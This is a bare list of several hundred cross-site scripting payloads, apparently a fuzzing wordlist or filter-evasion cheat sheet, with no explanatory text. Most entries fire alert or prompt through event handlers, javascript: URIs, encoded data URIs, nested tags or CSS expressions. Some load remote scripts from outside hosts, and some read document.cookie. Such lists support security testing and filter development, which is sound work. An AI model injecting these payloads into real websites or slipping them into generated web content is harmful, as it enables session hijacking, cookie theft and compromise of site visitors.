<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
veris-->group<svg/onload=alert(/XSS/)//
#"><img src=M onerror=alert('XSS');>
element[attribute='<img src=x onerror=alert('XSS');>
[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
%22;alert%28%27RVRSH3LL_XSS%29//
javascript:alert%281%29;
<w contenteditable id=x onfocus=alert()>
alert;pg("XSS")
<svg/onload=%26%23097lert%26lpar;1337)>
<script>for((i)in(self))eval(i)(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
<sCR<script>iPt>alert(1)</SCr</script>IPt>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<INPUT TYPE="BUTTON" action="alert('XSS')"/>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
<iframe src=http://xss.rocks/scriptlet.html <
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
